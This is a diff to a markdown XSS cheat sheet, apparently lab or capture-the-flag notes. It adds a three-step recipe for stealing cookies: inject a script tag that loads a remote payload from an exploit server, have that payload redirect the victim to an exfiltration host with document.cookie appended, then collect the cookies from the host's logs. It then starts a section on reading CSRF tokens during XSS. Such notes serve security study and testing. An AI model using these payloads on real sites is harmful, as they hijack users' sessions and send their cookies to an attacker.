@@ -1,4 +1,18 @@
 # XSS
+
+## XSS via window.location
+1. Identify XSS vuln and paste such payload
+```html
+<script src="http://exploit.server/payload"></script>
+```
+2. In exploit server create such js-script
+```javascript
+window.location = "http://exfiltrate.htb/cookiestealer?c=" + document.cookie;
+```
+3. On `exfiltrate.htb` get cookies from logs.
+
+
+
 ## Reading CSRF token from response during XSS
 ```javascript
 // GET CSRF token
